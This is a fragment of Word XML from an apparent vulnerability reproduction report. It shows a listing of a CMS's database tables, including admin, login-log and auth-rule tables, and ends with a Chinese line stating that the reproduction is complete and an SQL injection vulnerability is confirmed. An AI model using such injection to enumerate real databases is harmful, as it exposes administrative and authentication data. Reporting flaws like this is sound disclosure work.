        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:t>| admin_login_log       |</w:t>
        <w:br/>
        <w:t>| cms_ad                |</w:t>
        <w:br/>
        <w:t>| cms_adflash           |</w:t>
        <w:br/>
        <w:t>| cms_admin             |</w:t>
        <w:br/>
        <w:t>| cms_adpos             |</w:t>
        <w:br/>
        <w:t>| cms_archives          |</w:t>
        <w:br/>
        <w:t>| cms_auth_group        |</w:t>
        <w:br/>
        <w:t>| cms_auth_group_access |</w:t>
        <w:br/>
        <w:t>| cms_auth_rule         |</w:t>
        <w:br/>
        <w:t>| cms_bot               |</w:t>
        <w:br/>
        <w:t>| cms_cate              |</w:t>
        <w:br/>
        <w:t>| cms_conf              |</w:t>
        <w:br/>
        <w:t>| cms_html              |</w:t>
        <w:br/>
        <w:t>| cms_keywords          |</w:t>
        <w:br/>
        <w:t>| cms_link              |</w:t>
        <w:br/>
        <w:t>| cms_model             |</w:t>
        <w:br/>
        <w:t>| cms_model_fields      |</w:t>
        <w:br/>
        <w:t>| cms_note              |</w:t>
        <w:br/>
        <w:t>| cms_wenzhang          |</w:t>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>复现完成，验证存在SQL注入漏洞</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